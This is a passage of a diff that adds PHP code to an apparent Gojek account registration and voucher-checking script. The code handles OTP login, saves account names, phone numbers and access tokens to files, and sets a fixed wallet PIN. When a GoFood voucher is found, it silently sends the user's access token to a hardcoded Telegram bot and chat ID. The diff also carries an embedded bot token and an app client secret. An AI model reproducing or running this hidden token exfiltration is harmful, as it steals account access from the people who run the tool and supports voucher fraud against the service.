+        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
+        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
+        echo "\n".color("yellow","!] Total voucher ".$total." : ");
+        echo color("green","1. ".$voucher1);
+        echo "\n".color("green","                     2. ".$voucher2);
+        echo "\n".color("green","                     3. ".$voucher3);
+        echo "\n".color("green","                     4. ".$voucher4);
+        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
+        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
+        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
+        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
+                                        $TOKEN  = "931114159:AAGK4O3nuld9uNw_IneDcSPVxYDGAaaazvQ";
+					$chatid = "905644289";
+                                        if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
+					$pesan 	= $token;
+					$method	= "sendMessage";
+					$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
+					$post = [
+ 					'chat_id' => $chatid,
+ 			        	'text' => $pesan
+					];
+                                        $header = [
+                                        "X-Requested-With: XMLHttpRequest",
+                                        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
+                                        ];
+                                        $ch = curl_init();
+                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                                        curl_setopt($ch, CURLOPT_URL, $url);
+                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
+                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                                        $datas = curl_exec($ch);
+                                        $error = curl_error($ch);
+                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                                        curl_close($ch);
+                                        $debug['text'] = $pesan;
+                                        $debug['respon'] = json_decode($datas, true);
+                                        }
+         if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
+         save("akungojek20k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
+         }else{
+         save("akungojek10k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
+         }
+         setpin:
+         echo "\n".color("nevy","?] Mau set PIN? : ");
+         $pilih1 = trim(fgets(STDIN));
+         if($pilih1 == "y" && strpos($no, "628")){
+         echo color("red","===============(SET PIN)===============")."\n";
+         $data2 = '{"pin":"112233"}';
+         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
+         echo "OTP set pin : ";
+         $otpsetpin = trim(fgets(STDIN));
+         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
+         echo $verifotpsetpin;
+         }else if($pilih1 == "n" || $pilih1 == "N"){
+         die();
+         }else{
+         echo color("red","-] Access Denied !\n");
+         }
+         }
+         }
+         }
+         }else{
+         goto setpin;
+         }
+         }else{
+         echo color("red","-] OTP yang anda Masukkan salah");
+         echo"\n==================================\n\n";
+         echo color("yellow","!] Silahkan Masukkan kembali\n");
+         goto otp;
+         }
+         }else{
+         echo "Nomor HP sudah terdaftar";
+         echo "\nCek Info Akun ? (y/n): ";
+         $pilih = trim(fgets(STDIN));
+         if($pilih == "y" || $pilih == "Y"){
+         echo "\n===============Login================\n";
+         echo "Nomor HP : ".$no."\n";
+         $datalogin = '{"phone":"+'.$no.'"}';
+         $login = request('/v4/customers/login_with_phone', null, $datalogin);
+         if(strpos($login, '"login_token"')){
+         echo "Kode verifikasi sudah di kirim";
+         echo "\nOTP : ";
+         $otplogin = trim(fgets(STDIN));
+         $logintoken = getStr('"login_token": "','"',$login);
+         $datalogin1 = '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otplogin.'","otp_token":"'.$logintoken.'"},"grant_type":"otp","scopes":"gojek:customer:transaction gojek:customer:readonly"}';
+         $veriflogin = request('/v4/customers/login/verify', null, $datalogin1);
+         echo $veriflogin;
+         $token = getStr('"access_token":"','"',$veriflogin);
+         $uuid = getStr('"resource_owner_id":',',',$veriflogin);
+         $data2 = '{"pin":"112233"}';
+         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
+
+         echo "OTP set pin: ";
+         $otpsetpin = trim(fgets(STDIN));
+         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
+         echo $verifotpsetpin;;
+         }else{
+         echo "404 Not Found ! Please Try Again";
+         }
+         }else{
+         echo "\n==============Register==============\n";
+         goto ulang;
+  }
+ }
+}
+echo change()."\n"; ?>
